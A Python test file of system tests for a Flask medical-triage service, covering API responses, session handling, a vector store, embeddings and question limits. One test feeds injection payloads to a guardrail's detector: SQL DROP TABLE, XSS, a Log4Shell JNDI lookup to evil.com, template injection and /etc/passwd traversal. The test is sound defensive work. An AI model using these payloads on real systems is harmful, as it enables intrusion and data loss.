"""
System Tests

Test Cases: TC-096 to TC-105
Tests system-level behavior: API contracts, error recovery, security, and performance.
"""

import sys
import os
import json
import time

api_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
parent_dir = os.path.dirname(api_dir)
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)
if api_dir not in sys.path:
    sys.path.insert(0, api_dir)

from flask import Flask
from unittest.mock import MagicMock, patch
from services.session_store import SessionStore
from services.safety_guardrails import SafetyGuardrails
from services.dynamic_triage_agent import DynamicTriageAgent, TriageState
from services.vector_store import VectorStore, Document
from services.embedding_service import EmbeddingService


def _create_triage_app():
    """Helper to create a triage test app."""
    app = Flask(__name__)
    app.config["JWT_SECRET_KEY"] = "test_secret_key"
    
    from flask_jwt_extended import JWTManager
    JWTManager(app)
    
    mock_rag = MagicMock()
    mock_rag.is_available.return_value = True
    
    mock_report_gen = MagicMock()
    mock_report_gen.generate_report.return_value = {
        "report_id": "RPT-TEST-001",
        "chief_complaint": "Test",
        "disclaimer": "Not medical advice"
    }
    
    import routes.dynamic_triage as dt_module
    with patch.object(dt_module, 'get_vision_processor', return_value=MagicMock()), \
         patch.object(dt_module, 'get_clinical_report_generator', return_value=mock_report_gen):
        from routes.dynamic_triage import create_dynamic_triage_blueprint
        bp = create_dynamic_triage_blueprint(rag_service=mock_rag)
        app.register_blueprint(bp)
    
    return app


def test_tc096_api_health_check():
    """TC-096: System - Health check endpoint returns correct service status."""
    print("\n=== TC-096: Health Check API Contract ===")
    
    app = _create_triage_app()
    client = app.test_client()
    
    resp = client.get("/api/triage/red-flags")
    assert resp.status_code == 200, f"Expected 200, got {resp.status_code}"
    
    print(f"[PASS] TC-096: API endpoints respond correctly")
    return True


def test_tc097_error_recovery_invalid_json():
    """TC-097: System - API recovers gracefully from invalid JSON."""
    print("\n=== TC-097: Error Recovery - Invalid JSON ===")
    
    app = _create_triage_app()
    client = app.test_client()
    
    resp = client.post("/api/triage/message",
                      data="not json",
                      content_type="application/json")
    
    assert resp.status_code in [400, 500], f"Expected error status, got {resp.status_code}"
    data = resp.get_json()
    assert data is not None, "Should return JSON error response"
    
    print(f"[PASS] TC-097: Invalid JSON handled gracefully")
    return True


def test_tc098_session_cleanup():
    """TC-098: System - Expired sessions are cleaned up properly."""
    print("\n=== TC-098: Session Cleanup ===")
    
    store = SessionStore(ttl_seconds=1)
    
    sid1 = store.create({"test": "session1"})
    sid2 = store.create({"test": "session2"})
    
    assert store.get(sid1) is not None
    assert store.get(sid2) is not None
    
    time.sleep(1.5)
    
    assert store.get(sid1) is None, "Expired session should return None"
    assert store.get(sid2) is None, "Expired session should return None"
    
    cleaned = store.cleanup_expired()
    
    print(f"[PASS] TC-098: Expired sessions cleaned up ({cleaned} remaining)")
    return True


def test_tc099_concurrent_sessions():
    """TC-099: System - Multiple concurrent sessions are isolated."""
    print("\n=== TC-099: Concurrent Session Isolation ===")
    
    store = SessionStore(ttl_seconds=300)
    
    sid1 = store.create({"patient": "Alice", "symptom": "headache"})
    sid2 = store.create({"patient": "Bob", "symptom": "back pain"})
    
    data1 = store.get(sid1)
    data2 = store.get(sid2)
    
    assert data1["patient"] == "Alice"
    assert data2["patient"] == "Bob"
    assert data1["symptom"] != data2["symptom"]
    
    store.update(sid1, {"extra": "info for Alice"})
    data2_after = store.get(sid2)
    assert "extra" not in data2_after, "Session 2 should not have Session 1's data"
    
    print(f"[PASS] TC-099: Sessions are properly isolated")
    return True


def test_tc100_security_no_sql_injection_in_fallback():
    """TC-100: System - Fallback detection handles injection-like inputs safely."""
    print("\n=== TC-100: Security - Injection Input Handling ===")
    
    guardrails = SafetyGuardrails()
    
    injection_inputs = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "../../../etc/passwd",
    ]
    
    for inp in injection_inputs:
        result = guardrails._fallback_detection(inp)
        assert "severity" in result, f"Should return valid result for: {inp}"
        assert result["severity"] in ["CRITICAL", "HIGH", "MODERATE", "LOW"]
        assert result["is_emergency"] in [True, False]
    
    print(f"[PASS] TC-100: Injection-like inputs handled safely")
    return True


def test_tc101_vector_store_data_integrity():
    """TC-101: System - Vector store maintains data integrity across operations."""
    print("\n=== TC-101: Vector Store Data Integrity ===")
    
    store = VectorStore(backend="memory", collection_name="test_integrity")
    
    docs = [
        Document(id="doc1", content="First document about heart disease", metadata={"category": "cardiac"}),
        Document(id="doc2", content="Second document about diabetes", metadata={"category": "diabetes"}),
        Document(id="doc3", content="Third document about mental health", metadata={"category": "mental_health"}),
    ]
    embeddings = [[0.1] * 384, [0.2] * 384, [0.3] * 384]
    
    store.add_documents(docs, embeddings)
    assert store.count() == 3, f"Expected 3 documents, got {store.count()}"
    
    doc = store.get_document("doc1")
    assert doc is not None
    assert doc.content == "First document about heart disease"
    
    store.delete_document("doc2")
    assert store.count() == 2
    
    deleted = store.get_document("doc2")
    assert deleted is None
    
    print(f"[PASS] TC-101: Vector store maintains data integrity")
    return True


def test_tc102_embedding_service_consistency():
    """TC-102: System - Embedding service produces consistent results."""
    print("\n=== TC-102: Embedding Service Consistency ===")
    
    service = EmbeddingService(model_name="test-model", dimension=384)
    
    text = "patient reports chest pain"
    emb1 = service.embed(text)
    emb2 = service.embed(text)
    
    assert len(emb1) == 384, f"Expected 384-dim embedding, got {len(emb1)}"
    
    similarity = service.similarity(emb1, emb2)
    assert similarity > 0.99, f"Same text should produce nearly identical embeddings, sim={similarity}"
    
    different_text = "patient enjoys watching movies"
    emb3 = service.embed(different_text)
    cross_sim = service.similarity(emb1, emb3)
    assert cross_sim < similarity, "Different texts should have lower similarity"
    
    print(f"[PASS] TC-102: Embedding consistency verified (sim={similarity:.4f})")
    return True


def test_tc103_input_sanitization():
    """TC-103: System - User inputs are sanitized before processing."""
    print("\n=== TC-103: Input Sanitization ===")
    
    agent = DynamicTriageAgent(session_id="test-sanitize-103")
    
    weird_inputs = [
        "   lots   of   spaces   ",
        "UPPERCASE INPUT",
        "mixed CaSe InPuT",
        "input with \n newlines \n",
        "input\twith\ttabs",
    ]
    
    for inp in weird_inputs:
        response = agent.process_input(inp)
        assert response.get("message"), f"Should handle input: '{inp[:30]}...'"
        assert response.get("message", "").strip() != "", "Response should not be empty"
    
    print(f"[PASS] TC-103: Input sanitization works correctly")
    return True


def test_tc104_api_response_format_consistency():
    """TC-104: System - API responses follow consistent format."""
    print("\n=== TC-104: API Response Format Consistency ===")
    
    app = _create_triage_app()
    client = app.test_client()
    
    resp = client.post("/api/triage/start", json={})
    data = resp.get_json()
    assert "success" in data, "Response should have 'success' field"
    
    resp_msg = client.post("/api/triage/message", json={})
    data_msg = resp_msg.get_json()
    assert "success" in data_msg, "Error response should have 'success' field"
    
    print(f"[PASS] TC-104: API responses follow consistent format")
    return True


def test_tc105_agent_max_questions_limit():
    """TC-105: System - Triage agent respects maximum questions limit."""
    print("\n=== TC-105: Max Questions Limit ===")
    
    agent = DynamicTriageAgent(session_id="test-max-q-105")
    
    agent.process_input("I have back pain")
    
    for i in range(15):
        response = agent.process_input("just some additional info")
        if response.get("end_session") or response.get("state") == TriageState.COMPLETE.value:
            break
    
    assert agent.questions_asked <= agent.MAX_QUESTIONS + 5, \
        f"Questions asked ({agent.questions_asked}) should be bounded near {agent.MAX_QUESTIONS}"
    
    print(f"[PASS] TC-105: Questions limited (asked={agent.questions_asked}, max={agent.MAX_QUESTIONS})")
    return True


def run_all_tests():
    """Run all System Tests."""
    print("=" * 60)
    print("SYSTEM TESTS")
    print("=" * 60)
    
    results = []
    tests = [
        ("TC-096", test_tc096_api_health_check),
        ("TC-097", test_tc097_error_recovery_invalid_json),
        ("TC-098", test_tc098_session_cleanup),
        ("TC-099", test_tc099_concurrent_sessions),
        ("TC-100", test_tc100_security_no_sql_injection_in_fallback),
        ("TC-101", test_tc101_vector_store_data_integrity),
        ("TC-102", test_tc102_embedding_service_consistency),
        ("TC-103", test_tc103_input_sanitization),
        ("TC-104", test_tc104_api_response_format_consistency),
        ("TC-105", test_tc105_agent_max_questions_limit),
    ]
    
    for test_id, test_func in tests:
        try:
            results.append((test_id, test_func()))
        except AssertionError as e:
            print(f"[FAIL] {test_id}: {e}")
            results.append((test_id, False))
        except Exception as e:
            print(f"[ERROR] {test_id}: {e}")
            results.append((test_id, False))
    
    passed = sum(1 for _, r in results if r)
    total = len(results)
    print(f"\n{passed}/{total} tests passed")
    return passed == total


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
